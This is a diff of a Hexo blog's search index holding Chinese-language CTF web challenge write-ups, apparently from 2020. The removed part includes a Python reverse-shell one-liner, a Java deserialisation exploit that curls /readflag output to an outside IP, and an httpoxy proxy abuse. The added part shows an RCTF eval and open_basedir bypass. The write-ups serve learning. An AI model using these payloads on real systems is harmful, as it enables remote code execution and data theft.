@@ -1,128 +1,32 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/2020/03/03/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>V&amp;N招新赛web部分题解</title>
-    <url>/2020/02/29/V/</url>
-    <content><![CDATA[<p>V&amp;N招新赛部分web题解</p>
-<a id="more"></a>
-
-<h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p>考点：ctfd漏洞</p>
-<p>参考链接<a href="https://www.colabug.com/2020/0204/6940556/" target="_blank" rel="noopener">https://www.colabug.com/2020/0204/6940556/</a>漏洞的相关分析，上文写的很详细，这里就不再介绍。</p>
-<p>解题步骤：</p>
-<ol>
-<li>先注册一个admin的账号，通过在admin前面加空格来绕过重复限制。</li>
-<li>生成忘记密码的链接。</li>
-<li>更改自己用户名为非admin.</li>
-<li>点击更改密码的链接，改后登录</li>
-</ol>
-<p><img src="V/image-20200229183951772.png" alt="image-20200229183951772"></p>
-<p>下载，后就得到flag.</p>
-<h2 id="CHECKIN"><a href="#CHECKIN" class="headerlink" title="CHECKIN"></a>CHECKIN</h2><p>考点：python反弹shell   proc目录</p>
-<p>访问就可以得到源码，右键源代码看到的代码自动有换行</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route('/flag')</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route('/shell')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">()</span>:</span></span><br><span class="line">    os.system(<span class="string">"rm -f flag.txt"</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">'c'</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"app.py"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>
-
-<p>看到很简单的源码，有两个路由，</p>
-<ul>
-<li>/  ：可以得到app.py源码</li>
-<li>/shell  : 通过传入c变量可以执行命令，但是会删除flag.txt文件。</li>
-</ul>
-<p>开始时，想着通过类似时间盲注的方法去做题，后来一想python可以直接反弹shell,</p>
-<p>然后开了个linux-lab，反弹shell。</p>
-<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">c=python3%<span class="number">20</span>-c%<span class="number">20</span>%<span class="number">27</span><span class="keyword">import</span>%<span class="number">20</span>socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%<span class="number">22174.0</span><span class="number">.216</span><span class="number">.234</span>%<span class="number">22</span>,<span class="number">1234</span>));os.dup2(s.fileno(),<span class="number">0</span>);%<span class="number">20</span>os.dup2(s.fileno(),<span class="number">1</span>);%<span class="number">20</span>os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([%<span class="number">22</span>/bin/sh%<span class="number">22</span>,%<span class="number">22</span>-i%<span class="number">22</span>]);%<span class="number">27</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="V/image-20200229184920698.png" alt="image-20200229184920698"></p>
-<p>之后就是找flag了，这里又学到了linux中/proc目录内容。更详细的可以<a href="https://blog.spoock.com/2019/10/08/proc/" target="_blank" rel="noopener">参考</a>这篇文章，总结的很详细。</p>
-<p><img src="V/image-20200229185248748.png" alt="image-20200229185248748"></p>
-<p>由于ps命令不可用，这里我们就去翻一下文件夹</p>
-<p><img src="V/image-20200229185546941.png" alt=""></p>
-<p>最后在/proc/10/fd文件里看见了flag</p>
-<h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><p>这题也给了源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>队友直接发了一个<strong>cve-2016-5385</strong>，然后去网上查一查，看到<a href="https://github.com/vulhub/vulhub/blob/master/cgi/httpoxy/www/index.php" target="_blank" rel="noopener">vulhub里面就有</a>看一下里里面的源码，</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: application/json; charset=utf-8'</span>);</span><br><span class="line"></span><br><span class="line">$client = <span class="keyword">new</span> Client([</span><br><span class="line">    <span class="comment">// Base URI is used with relative requests</span></span><br><span class="line">    <span class="string">'base_uri'</span> =&gt; <span class="string">'http://httpbin.org'</span>,</span><br><span class="line">    <span class="comment">// You can set any number of default request options.</span></span><br><span class="line">    <span class="string">'timeout'</span>  =&gt; <span class="number">2.0</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$response = $client-&gt;get(<span class="string">'http://httpbin.org/get'</span>);</span><br><span class="line"></span><br><span class="line">$body = $response-&gt;getBody();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $body;</span><br></pre></td></tr></table></figure>
-
-<p>源码差不多</p>
-<blockquote>
-<p>简单来说，根据RFC 3875规定，cgi（fastcgi）要将用户传入的所有HTTP头都加上<code>HTTP_</code>前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的<code>HTTP_PROXY</code>值作为HTTP代理地址。于是，恶意用户通过提交<code>Proxy: http://evil.com</code>这样的HTTP头，将使用缺陷类库的网站的代理设置为<code>http://evil.com</code>，进而窃取数据包中可能存在的敏感信息。</p>
-</blockquote>
-<p>这种漏洞的利用，通过在http请求头中添加Proxy头，就可以把请求代理到恶意的代理服务器，进而可以窃取数据报的敏感信息，也可以篡改请求报的响应。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>从上面的关键代码可以看到，要得到flag,需要满足<code>$data[&#39;success&#39;] === true</code>，如果请求代理到我们的服务器，然后回向<a href="http://127.0.0.1:5000/api/eligible发送请求，如果发送的请求，json解码后，$data[&#39;success&#39;]为true,就会得到flag。" target="_blank" rel="noopener">http://127.0.0.1:5000/api/eligible发送请求，如果发送的请求，json解码后，$data[&#39;success&#39;]为true,就会得到flag。</a></p>
-<p>解题步骤</p>
-<ul>
-<li>用我们的apache服务器作为代理服务器</li>
-</ul>
-<p><img src="V/image-20200229192230132.png" alt="image-20200229192230132"></p>
-<ul>
-<li><p>然后用php在本地起一个服务器，监听5000端口，在api/eligible目录下新建index.php,脚本输出，解码后$data[‘success’]为true。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">"success"</span>=&gt;<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode($a);</span><br></pre></td></tr></table></figure>
-
-<p>本地在用php启一个php的内置服务器，端口为5000</p>
-<p><img src="V/image-20200229193926226.png" alt="image-20200229193926226"></p>
-</li>
-<li><p>然后burp再发包，触发条件，得到flag。</p>
-</li>
-</ul>
-<p><img src="V/image-20200229194145302.png" alt="image-20200229194145302"></p>
-<h2 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h2><p>考点：java反序列化</p>
-<p>题目给了源码是war包，用tomcat部署后，</p>
-<p><img src="V/image-20200301110922154.png" alt="image-20200301110922154"></p>
-<p>浏览一下功能，可以上传，但是要webmanage权限，开始以为要修改权限，上传个图片马 什么的。</p>
-<p>然后审计源码，由于之前没有做过java的题，对java的程序框架不是很了解，一边百度一边理解，<img src="V/image-20200301111336301.png" alt=""></p>
-<p>程序大致的框架就是这样（本人的理解），有控制器，有jsp文件，lib文件夹里面的都是引用的jar包，看了里面的jar包，没有反序列化漏洞的版本。这里的ClientinfoFilter就是一个全局过滤器，在web.xml文件中，</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>clientinfo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.filters.ClentInfoFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>clientinfo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>*<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>filter-class  必需元素，它指定过滤器实现类的完全限定名。</p>
-<p>filter-name  这个必需的元素必须与用filter元素声明时给予过滤器的名称相匹配。</p>
-<p>servlet-name  此元素给出一个名称，此名称必须与利用servlet元素给予servlet或JSP页面的名称相匹配。</p>
-</blockquote>
-<p><a href="http://www.51gjie.com/javaweb/868.html" target="_blank" rel="noopener">参考链接</a></p>
-<p><img src="V/image-20200301112633247.png" alt="image-20200301112633247"></p>
-<p>然后我们继续看ClientinfoFilter中的doFilter方法，</p>
-<p><img src="V/image-20200301112812260.png" alt="image-20200301112812260"></p>
-<p>首先去取cookie,如果cookie中有cinfo,exist就为true,然后进入判断，将cookie中的cinfo值base64解码，然后调用Tools.parse()方法，继续跟进</p>
-<p><img src="V/image-20200301113107762.png" alt="image-20200301113107762"></p>
-<p>parse方法对输入进行了反序列化，可以发现Tools类重写了readObject方法，<a href="http://www.lmxspace.com/2019/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%B7%B1%E7%A9%B6/" target="_blank" rel="noopener">那么参考大佬的文章</a>，重写反序列化方法会有风险，而且这里重写的方法还调用了ProcessBuilder().start)(),这个方法可以执行命令，到了这里，我们的思路就很清晰了，通过构造cookie,触发反序列化，调用重写的readObject方法，进而调用ProcessBuilder.start()方法，执行命令。</p>
-<p>首先，我们在本地尝试一下可不可以，</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//exp.java</span></span><br><span class="line"><span class="keyword">package</span> com.tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Tools test = <span class="keyword">new</span> Tools();</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = Tools.create(test);</span><br><span class="line">            Base64.Encoder  encoder = Base64.getEncoder();</span><br><span class="line">            System.out.println(encoder.encodeToString(bytes));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>从上图我们可以看到create()方法中调用了writeObject，所以我们可以重写writeObject（）函数，来进一步利用</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Tools.java</span></span><br><span class="line"><span class="keyword">package</span> com.tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tools</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String testCall;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tools</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(bytes));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] create(Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        Object obj = in.readObject();</span><br><span class="line">        (<span class="keyword">new</span> ProcessBuilder((String[])((String[])obj))).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span><span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="comment">//String[] cmd=&#123;"/bin/sh", "-c","curl -d `/readflag` 174.0.219.93:8888"&#125;;</span></span><br><span class="line">        String[] cmd=&#123;<span class="string">"calc"</span>&#125;;</span><br><span class="line">        out.writeObject(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="V/image-20200301120719913.png" alt="image-20200301120719913"></p>
-<p>将运行后的base64，放入test.java中测试一下</p>
-<p><img src="V/image-20200301120834520.png" alt="image-20200301120834520"></p>
-<p>之后就可以执行命令了，<a href="http://www.lmxspace.com/2019/10/08/Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">这里参考一下师傅的文章</a>，里面讲解了Runtime.getRuntime().exec(cmd)和ProcessBuilder pb=new ProcessBuilder(cmd)的区别和用法，</p>
-<p>然后我们把命令改下</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span><span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">      String[] cmd=&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>,<span class="string">"curl -d `/readflag` 174.0.219.93:8888"</span>&#125;;</span><br><span class="line">      <span class="comment">//String[] cmd=&#123;"calc"&#125;;</span></span><br><span class="line">      out.writeObject(cmd);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-
-<p>生成的替换下cookie,就得到了 flag</p>
-<p><img src="V/image-20200301122930606.png" alt="image-20200301122930606"></p>
+    <title>RCTF-R-CURSIVE</title>
+    <url>/2020/03/04/RCTF-R-CURSIVE/</url>
+    <content><![CDATA[<p>这次的rctf没怎么看，傍晚开始看 r-cursive 这题，源码特别简单:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) === <span class="string">'9944105bfb8294278dbf87f4c52e8476ebf9ab68'</span> ?: <span class="keyword">die</span>();</span><br><span class="line"><span class="string">';'</span> === preg_replace(<span class="string">'/[^\W_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'cmd'</span>]) ? <span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]) : show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>这里主要有正则，<code>preg_replace(&#39;/[^\W_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;cmd&#39;])</code>，\w 就很烦人了，所以首先要做的就是过这个正则达到任意执行。通过构造cmd=eval(next(getallheaders()));在请求头里插入可执行代码来达到任意执行(这里不止next可以用，主要就是决定你构造代码放在header的什么位置，还有implode，end…..都可以用)我用的是next就是，执行代码插在user_agent中：</p>
+<p><img src="RCTF-R-CURSIVE/8418106-c17d1e0247b7b179.png" alt="Test"></p>
+<p>那么接下来也就是要列出目录，找到flag文件了，这里卡了好久，主要要做的就是绕过openbase_dir的限制，把出了/tmp目录和index.php所在目录除外的其他目录给列出来</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8418106-7fd934ffcfedf20f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="openbase_dir限制"></p>
+<p>最后通过opendir + glob://协议列出目录：</p>
+<p><code>if($dh=opendir(&quot;glob:///var\*/www\*/sandbox\*/\*&quot;)){while(($file=readdir($dh))!==false){echo&quot;$file\n&quot;;}closedir($dh);}</code></p>
+<p>一波谜一样的操作</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8418106-f8dd88d7fe7e973c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="列出目录"></p>
+<p>发现众多token文件夹后面夹生这init.php和php.ini，猜测flag应该是放在init.php里了，但是我们的权限是在 78854209fa4889d51dd0016ceab319f852d90ec9 文件夹下面的，因为vhost_alias的配置的原因，所以我们默认进入网站的时候是在token目录下的，因为openbase_dir的限制，直接读取init.php文件是读不到的</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8418106-a753f240ddb7aaf1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="读取init.php文件失败"></p>
+<p>这里可以想想因为我们默认是在token文件夹里，所以我们可以正常读取index.php的源码，那如果我们出了token文件夹，那也就可以正常读取init.php文件了所以我们可以修改请求时的URL:<a href="http://78854209fa4889d51dd0016ceab319f852d90ec9.sandbox.r-cursive.ml:1337/78854209fa4889d51dd0016ceab319f852d90ec9/?cmd=eval(next(getallheaders()" target="_blank" rel="noopener">http://78854209fa4889d51dd0016ceab319f852d90ec9.sandbox.r-cursive.ml:1337/78854209fa4889d51dd0016ceab319f852d90ec9/?cmd=eval(next(getallheaders()</a>)); 修改请求头中的HOST为:.sandbox.r-cursive.ml:1337，利用file_get_contents()函数来读取init.php文件</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8418106-fa9223d7f5547395.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="init.php"></p>
+<p>这样也就跨出限制，成功读取到flag。</p>
+<p><strong>比赛滑水，也就只看了这道题，其他的题看都没看，不过这次比赛题目质量真心好，有时间都可以做做，仅写来供自己学习记录用。</strong></p>
 ]]></content>
       <categories>
-        <category>漏洞挖掘</category>
+        <category>Cyc1e的CTF之路</category>
       </categories>
+      <tags>
+        <tag>open_basedir</tag>
+        <tag>RCE</tag>
+      </tags>
   </entry>
   <entry>
     <title>2020新春战役网络安全公益赛web部分题解</title>
